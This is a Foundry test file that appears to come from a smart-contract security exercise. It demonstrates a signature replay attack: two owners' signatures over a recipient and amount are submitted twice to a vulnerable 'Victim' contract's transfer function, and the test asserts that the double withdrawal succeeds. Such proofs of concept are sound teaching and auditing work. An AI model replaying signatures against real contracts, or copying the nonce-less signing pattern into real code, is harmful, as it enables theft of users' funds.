// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18; //slyther advices not to use upper versions

import {Test, console} from "forge-std/Test.sol";
import {Victim} from "../src/W_SignatureReplay.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract SignatureReplayTest is Test {
    using ECDSA for bytes32;
    using MessageHashUtils for bytes32;

    Victim public victim;
    address public alice;
    uint256 public alicePk;
    address public bob;
    uint256 public bobPk;
    address[2] public owners;
    uint256 public constant AMOUNT = 0.1 ether;

    function setUp() public {
        (alice, alicePk) = makeAddrAndKey("alice");
        (bob, bobPk) = makeAddrAndKey("bob");
        owners = [alice, bob];
        victim = new Victim(owners);

        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.prank(alice);
        victim.deposit{value: 1 ether}();
        vm.prank(bob);
        victim.deposit{value: 1 ether}();
    }

    function test_attackSignatureReplay() public {
        vm.startPrank(alice);
        bytes32 hash = keccak256(abi.encodePacked(bob, AMOUNT)).toEthSignedMessageHash();
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(alicePk, hash);
        bytes memory aliceSignature = abi.encodePacked(r1, s1, v1);
        vm.stopPrank();
        vm.startPrank(bob);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(bobPk, hash);
        bytes memory bobSignature = abi.encodePacked(r2, s2, v2);
        vm.stopPrank();
        bytes[2] memory ownersSig = [aliceSignature, bobSignature];
        
        vm.prank(alice);
        victim.transfer(bob, 0.1 ether, ownersSig);
        victim.transfer(bob, 0.1 ether, ownersSig);
        assertEq(bob.balance, 0.2 ether);
    }
}
